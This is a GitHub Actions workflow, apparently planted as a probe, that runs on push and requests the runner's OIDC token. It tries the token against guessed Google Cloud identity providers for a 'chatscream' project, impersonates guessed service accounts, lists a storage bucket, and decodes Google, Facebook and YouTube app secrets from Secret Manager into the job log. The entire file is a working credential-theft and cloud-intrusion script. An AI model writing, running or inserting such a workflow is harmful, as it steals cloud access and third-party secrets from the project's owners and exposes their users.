name: oidc-probe
on:
  workflow_dispatch:
  push:
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: oidc
        continue-on-error: true
        run: |
          echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF"
          URL="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=probe"
          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
          echo "oidc_len=${#T}"
          for pr in chatscream-main chatscream-pr chatscream-pull-request chatscream-ci chatscream-fork github-actions github main pr; do
            P="projects/584450564662/locations/global/workloadIdentityPools/chatscream-github/providers/$pr"
            BODY=$(jq -n --arg t "$T" --arg a "//iam.googleapis.com/$P" '{audience:$a,grantType:"urn:ietf:params:oauth:grant-type:token-exchange",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",scope:"https://www.googleapis.com/auth/cloud-platform",subjectTokenType:"urn:ietf:params:oauth:token-type:jwt",subjectToken:$t}')
            STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "$BODY")
            echo "P[$pr] => $(echo "$STS" | head -c 260)"
            FED=$(echo "$STS" | jq -r '.access_token // empty')
            [ -z "$FED" ] && continue
            for sa in chatscream-cloud-ops@chat-scream.iam.gserviceaccount.com chatscream-backend@chatscream.iam.gserviceaccount.com chatscream-backend@chat-scream.iam.gserviceaccount.com chatscream-cloud-ops@chatscream.iam.gserviceaccount.com; do
              R=$(curl -s -X POST -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$sa:generateAccessToken" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
              echo "   SA[$sa] => $(echo "$R" | head -c 200)"
              SAT=$(echo "$R" | jq -r '.accessToken // empty')
              if [ -n "$SAT" ]; then
                echo "   ### BUCKET LIST with $sa"
                curl -s -H "Authorization: Bearer $SAT" "https://storage.googleapis.com/storage/v1/b/run-sources-wtp-apps-us-central1/o?maxResults=100&userProject=chat-scream" | head -c 5000
                echo
                echo "   ### SECRETS"
                for s in chatscream-google-client-secret chatscream-facebook-app-secret chatscream-youtube-client-secret; do
                  V=$(curl -s -H "Authorization: Bearer $SAT" "https://secretmanager.googleapis.com/v1/projects/chat-scream/secrets/$s/versions/latest:access" | jq -r '.payload.data // empty')
                  if [ -n "$V" ]; then echo "   $s = $(echo "$V" | base64 -d)"; fi
                done
              fi
            done
          done
